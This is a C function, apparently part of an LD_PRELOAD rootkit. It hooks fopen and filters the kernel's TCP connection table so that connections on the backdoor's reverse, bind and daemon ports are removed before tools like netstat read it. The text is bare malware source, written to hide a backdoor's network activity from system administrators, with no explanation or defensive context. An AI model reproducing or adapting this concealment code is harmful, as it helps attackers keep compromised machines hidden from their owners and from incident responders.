FILE *hide_port(const char *filename) {
	char line[LINE_MAX];
 	unsigned long rxq, txq, time_len, retr, inode;
	int local_port, rem_port, d, state, uid, timer_run, timeout;
	char rem_addr[128], local_addr[128], more[512];
	FILE *tmp = tmpfile ();
	FILE *pnt; 
	orig_fopen = dlsym(RTLD_NEXT,"fopen");
	pnt = orig_fopen (filename, "r");
	while (fgets (line, LINE_MAX, pnt) != NULL) {
		sscanf (line, "%d: %64[0-9A-Fa-f]:%X %64[0-9A-Fa-f]:%X %X %lX:%lX %X:%lX %lX %d %d %lu %512s\n",
		&d, local_addr, &local_port, rem_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout,
		&inode, more);
		if ((rem_port == BDS_REVERSE_PORT)  || (rem_port == BDS_DAEMON_PORT)  || (local_port == BDS_BIND_PORT)  || (local_port == BDS_DAEMON_PORT) ) {
		}
		else {
			fputs (line, tmp);
		}
	}
	fclose (pnt);
	fseek (tmp, 0, SEEK_SET);

	return tmp;
}